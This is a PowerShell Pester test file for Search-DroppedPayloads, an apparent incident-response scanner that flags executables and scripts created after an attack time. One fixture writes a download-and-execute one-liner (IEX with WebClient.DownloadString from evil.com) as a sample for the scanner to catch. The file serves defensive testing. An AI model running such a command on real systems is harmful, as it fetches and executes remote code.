BeforeAll {
    . "$PSScriptRoot/../Private/Search-DroppedPayloads.ps1"
    $attackStart = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
}

Describe 'Search-DroppedPayloads' {
    Context 'no suspicious files in scan paths' {
        BeforeAll {
            $cleanDir = Join-Path $TestDrive 'clean-temp'
            $null = New-Item -ItemType Directory -Path $cleanDir -Force
            'normal text file' | Set-Content (Join-Path $cleanDir 'readme.txt')
        }
        It 'returns empty without throwing' {
            { Search-DroppedPayloads -ScanPaths @($cleanDir) -AttackWindowStart $attackStart } | Should -Not -Throw
            Search-DroppedPayloads -ScanPaths @($cleanDir) -AttackWindowStart $attackStart | Should -BeNullOrEmpty
        }
    }

    Context 'PE executable (MZ header) created after attack window' {
        BeforeAll {
            $tmpDir = Join-Path $TestDrive 'suspicious-temp'
            $null = New-Item -ItemType Directory -Path $tmpDir -Force
            $exePath = Join-Path $tmpDir 'update_helper.exe'
            # Write MZ header (PE magic bytes)
            [byte[]]$mzBytes = 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00
            [IO.File]::WriteAllBytes($exePath, $mzBytes)
            (Get-Item $exePath).CreationTime = $attackStart.AddHours(1)
        }
        It 'detects PE file as DroppedExecutable with Critical severity' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            $r = $results | Where-Object Type -eq 'DroppedExecutable'
            $r          | Should -Not -BeNullOrEmpty
            $r.Severity | Should -Be 'Critical'
        }
        It 'includes SHA256 hash in finding' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'DroppedExecutable').Hash | Should -Not -BeNullOrEmpty
        }
    }

    Context 'suspicious PowerShell script created after attack window' {
        BeforeAll {
            $tmpDir   = Join-Path $TestDrive 'ps-temp'
            $null     = New-Item -ItemType Directory -Path $tmpDir -Force
            $ps1Path  = Join-Path $tmpDir 'a1b2c3d4.ps1'
            'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")' | Set-Content $ps1Path
            (Get-Item $ps1Path).CreationTime = $attackStart.AddMinutes(30)
        }
        It 'detects ps1 in temp as SuspiciousScript' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'SuspiciousScript') | Should -Not -BeNullOrEmpty
        }
    }

    Context 'file created before attack window' {
        BeforeAll {
            $tmpDir  = Join-Path $TestDrive 'old-temp'
            $null    = New-Item -ItemType Directory -Path $tmpDir -Force
            $oldExe  = Join-Path $tmpDir 'old.exe'
            [byte[]]$mzBytes = 0x4D, 0x5A
            [IO.File]::WriteAllBytes($oldExe, $mzBytes)
            (Get-Item $oldExe).CreationTime = $attackStart.AddDays(-30)
        }
        It 'does not flag files predating the attack' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            $results | Should -BeNullOrEmpty
        }
    }
}
